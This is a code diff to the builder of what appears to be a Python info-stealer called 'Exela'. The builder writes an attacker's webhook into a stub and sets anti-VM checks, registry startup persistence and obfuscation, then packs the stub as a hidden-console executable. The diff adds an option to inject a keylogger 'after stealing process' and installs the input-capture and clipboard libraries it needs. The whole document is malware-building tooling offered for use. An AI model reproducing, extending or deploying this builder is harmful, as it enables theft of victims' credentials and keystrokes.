@@ -5,6 +5,7 @@ class Build:
         self.versionFile = os.getcwd() + "\\AssemblySettings\\version.txt"
         self.pyinstallerCommand = f"pyinstaller --onefile --noconsole --clean --noconfirm --version-file {self.versionFile} --upx-dir upx-4.0.2-win64 "
         self.useIcon = False
+        self.injectKeylogger = "sexx"
         self.startup = "false"
         self.startupMethod = "regedit"
         self.antivmorospusu = "true"
@@ -38,6 +39,11 @@ class Build:
                     self.startupMethod = None
             else:self.startup= "false"
             os.system("cls")
+            getKeyloggerReq = str(input('Yes/no\nafter stealing process do u want to inject keylogger : '))
+            if getKeyloggerReq.lower() == "y" or getKeyloggerReq.lower() == "yes":
+                self.injectKeylogger = '%keyloggertrue%'
+            else:
+                self.injectKeylogger = "%keyloggerfalse%"
             getIcon = str(input("Yes/no\nDo you want to change the icon of the file : "))
             iconPath = None
             if getIcon.lower() == "yes" or getIcon.lower() == "y":
@@ -53,8 +59,7 @@ class Build:
             else:self.pyinstallerCommand += "Obfuscated.py"
             with open("Exela.py", "r", encoding="utf-8", errors="ignore") as f:
                 readedCode = f.read()
-            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu).replace("%StartuP%", self.startup).replace("%MethoD%", self.startupMethod)
-            
+            replacedCode = readedCode.replace("%REPLACE_ME_FOR_QUiCADXD%", getWebhook[::-1]).replace('%AnTiVm%', self.antivmorospusu).replace("%StartuP%", self.startup).replace("%MethoD%", self.startupMethod).replace('%keyloggerinject???%', self.injectKeylogger)
             with open("stub.py", "w", encoding="utf-8", errors="ignore") as x:
                 x.write(replacedCode)
             self.obfuscateFile()
@@ -82,6 +87,9 @@ class Build:
     def moduleInstaller(self):
         try:
             os.system('cls')
+            os.system('pip install pynput')
+            os.system('pip install pillow')
+            os.system('pip install clipboard')
             os.system("pip install colorama")
             os.system("pip install cryptography")
             os.system("pip install psutil")
